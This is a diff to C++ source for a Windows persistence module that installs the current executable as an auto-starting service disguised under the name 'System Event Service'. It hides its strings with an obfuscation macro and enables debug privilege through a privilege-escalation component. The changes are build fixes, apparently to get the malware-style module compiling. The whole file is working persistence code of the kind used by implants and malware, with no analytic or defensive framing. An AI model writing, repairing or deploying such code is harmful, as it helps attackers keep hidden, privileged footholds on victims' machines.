@@ -2,12 +2,13 @@
 #include "core/Logger.h"
 #include "core/Configuration.h"
 #include "utils/FileUtils.h"
+#include "security/PrivilegeEscalation.h"  // Fixed include path
 #include "security/Obfuscation.h"
 #include <Windows.h>
 #include <string>
 #include <vector>
 
-// Obfuscated strings
+// Obfuscated strings - need to use the actual obfuscated values
 const auto OBF_SERVICE_PERSISTENCE = OBFUSCATE("ServicePersistence");
 const auto OBF_SERVICE_NAME = OBFUSCATE("SystemEventService");
 const auto OBF_SERVICE_DISPLAY = OBFUSCATE("System Event Service");
@@ -21,7 +22,7 @@ bool ServicePersistence::Install() {
         return true;
     }
 
-    if (!security::PrivilegeEscalation::EnablePrivilege(SE_DEBUG_NAME)) {
+    if (!PrivilegeEscalation::EnablePrivilege(SE_DEBUG_NAME)) {  // Fixed namespace
         LOG_WARN("Failed to enable debug privilege");
     }
 
@@ -31,13 +32,19 @@ bool ServicePersistence::Install() {
         return false;
     }
 
-    std::wstring exePath = utils::FileUtils::GetCurrentExecutablePath();
-    std::wstring fullPath = L"\"" + exePath + L"\" --service";
+    std::string exePath = utils::FileUtils::GetCurrentExecutablePath();  // Fixed return type
+    std::wstring wideExePath = utils::FileUtils::StringToWide(exePath);  // Convert to wide string
+    std::wstring fullPath = L"\"" + wideExePath + L"\" --service";
+
+    // Use the actual obfuscated string values
+    std::wstring serviceName = utils::FileUtils::StringToWide(OBF_SERVICE_NAME);
+    std::wstring serviceDisplay = utils::FileUtils::StringToWide(OBF_SERVICE_DISPLAY);
+    std::wstring serviceDesc = utils::FileUtils::StringToWide(OBF_SERVICE_DESC);
 
     SC_HANDLE service = CreateServiceW(
         scm,
-        OBFUSCATED_SERVICE_NAME,
-        OBFUSCATED_SERVICE_DISPLAY,
+        serviceName.c_str(),  // Use the actual string
+        serviceDisplay.c_str(),
         SERVICE_ALL_ACCESS,
         SERVICE_WIN32_OWN_PROCESS,
         SERVICE_AUTO_START,
@@ -49,7 +56,7 @@ bool ServicePersistence::Install() {
         DWORD error = GetLastError();
         if (error == ERROR_SERVICE_EXISTS) {
             LOG_DEBUG("Service already exists");
-            service = OpenServiceW(scm, OBFUSCATED_SERVICE_NAME, SERVICE_ALL_ACCESS);
+            service = OpenServiceW(scm, serviceName.c_str(), SERVICE_ALL_ACCESS);
         } else {
             LOG_ERROR("Failed to create service: " + std::to_string(error));
             CloseServiceHandle(scm);
@@ -58,7 +65,7 @@ bool ServicePersistence::Install() {
     }
 
     // Set service description
-    SERVICE_DESCRIPTIONW desc = { (LPWSTR)OBFUSCATED_SERVICE_DESC };
+    SERVICE_DESCRIPTIONW desc = { const_cast<LPWSTR>(serviceDesc.c_str()) };
     ChangeServiceConfig2W(service, SERVICE_CONFIG_DESCRIPTION, &desc);
 
     // Set failure actions
@@ -93,7 +100,8 @@ bool ServicePersistence::Remove() {
         return false;
     }
 
-    SC_HANDLE service = OpenServiceW(scm, OBFUSCATED_SERVICE_NAME, SERVICE_ALL_ACCESS);
+    std::wstring serviceName = utils::FileUtils::StringToWide(OBF_SERVICE_NAME);
+    SC_HANDLE service = OpenServiceW(scm, serviceName.c_str(), SERVICE_ALL_ACCESS);
     if (!service) {
         LOG_DEBUG("Service not found, nothing to remove");
         CloseServiceHandle(scm);
@@ -123,7 +131,8 @@ bool ServicePersistence::IsInstalled() const {
         return false;
     }
 
-    SC_HANDLE service = OpenServiceW(scm, OBFUSCATED_SERVICE_NAME, SERVICE_QUERY_CONFIG);
+    std::wstring serviceName = utils::FileUtils::StringToWide(OBF_SERVICE_NAME);
+    SC_HANDLE service = OpenServiceW(scm, serviceName.c_str(), SERVICE_QUERY_CONFIG);
     CloseServiceHandle(scm);
 
     if (!service) {
@@ -140,13 +149,14 @@ bool ServicePersistence::StartService() {
         return false;
     }
 
-    SC_HANDLE service = OpenServiceW(scm, OBFUSCATED_SERVICE_NAME, SERVICE_START);
+    std::wstring serviceName = utils::FileUtils::StringToWide(OBF_SERVICE_NAME);
+    SC_HANDLE service = OpenServiceW(scm, serviceName.c_str(), SERVICE_START);
     if (!service) {
         CloseServiceHandle(scm);
         return false;
     }
 
-    bool success = StartServiceW(service, 0, NULL);
+    bool success = ::StartServiceW(service, 0, NULL);  // Use :: to specify global namespace
     CloseServiceHandle(service);
     CloseServiceHandle(scm);
 
@@ -159,7 +169,8 @@ bool ServicePersistence::StopService() {
         return false;
     }
 
-    SC_HANDLE service = OpenServiceW(scm, OBFUSCATED_SERVICE_NAME, SERVICE_STOP);
+    std::wstring serviceName = utils::FileUtils::StringToWide(OBF_SERVICE_NAME);
+    SC_HANDLE service = OpenServiceW(scm, serviceName.c_str(), SERVICE_STOP);
     if (!service) {
         CloseServiceHandle(scm);
         return false;
